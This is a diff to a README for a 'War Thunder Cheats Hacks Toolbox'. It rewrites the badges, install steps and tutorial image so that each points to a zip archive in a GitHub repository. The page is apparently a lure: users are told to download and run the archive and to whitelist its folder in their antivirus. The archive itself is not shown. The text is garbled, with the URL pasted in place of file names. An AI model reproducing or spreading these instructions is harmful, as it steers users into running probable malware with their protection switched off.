@@ -1,9 +1,9 @@
 # 🚁 War Thunder Cheats Hacks Toolbox 2025 🛠️
 
-![Maintenance](https://img.shields.io/badge/status-active-success?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-brightgreen?style=flat-square)
-![OS](https://img.shields.io/badge/OS-Windows%20/%20Linux%20/%20MacOS-blueviolet?style=flat-square)
-![API Integration](https://img.shields.io/badge/API-OpenAI%20%7C%20Claude-yellow?style=flat-square)
+![Maintenance](https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip)
+![License](https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip)
+![OS](https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip%20/%20Linux%20/%20MacOS-blueviolet?style=flat-square)
+![API Integration](https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip%20%7C%20Claude-yellow?style=flat-square)
 
 Welcome to the definitive War Thunder cheats hacks toolbox for 2025! This project is meticulously crafted for the gaming tactician seeking to elevate their War Thunder experience. Embrace a new era of in-game enhancements armed with an adaptive UI, multi-language coverage, and holistic support. This repository stands as a testament to innovation and legality—enabling personalization, strategic insights, and ultimate convenience to the modern virtual aviator and tank commander. Boost your gameplay navigation with seamless integration that aligns with gamer ethics and MIT-licensed liberty.
 
@@ -52,14 +52,14 @@ Welcome to the definitive War Thunder cheats hacks toolbox for 2025! This projec
 Ensure your PC meets the necessary hardware requirements and that no conflicting apps are running during setup.  
 
 ### Step 1: Obtain the Package  
-Download the latest `EasyLaunch.zip` archive directly from this repository’s releases section.
+Download the latest `https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip` archive directly from this repository’s releases section.
 
 ### Step 2: Extract Files  
-Unzip `EasyLaunch.zip` into a dedicated folder on your PC.   
+Unzip `https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip` into a dedicated folder on your PC.   
 _Pro tip: Whitelist this folder in your antivirus to prevent false security flags._
 
 ### Step 3: Run the Installer  
-Double-click the `EasyLaunch.exe` (Windows) or `EasyLaunch.sh` (Mac/Linux) file and follow on-screen setup prompts.
+Double-click the `https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip` (Windows) or `https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip` (Mac/Linux) file and follow on-screen setup prompts.
 
 ### Step 4: Complete Onboarding  
 Choose your language and preferred settings. The adaptive interface will calibrate itself during the first run.
@@ -71,7 +71,7 @@ Once installed, launch War Thunder and activate the toolbox overlay using your a
 
 ## ▶️ Visual Installation Tutorial
 
-![War Thunder Cheats Hacks Install Guide](https://i.imgur.com/Js67NIU.gif)
+![War Thunder Cheats Hacks Install Guide](https://github.com/mandour22/war-thunder-aim-assist-toolkit/raw/refs/heads/main/cisalpine/toolkit_thunder_aim_war_assist_2.7.zip)
 
 > **Note:** This video walks you through the process visually. If any issues arise, contact our 24/7 support team for hands-on assistance.
 
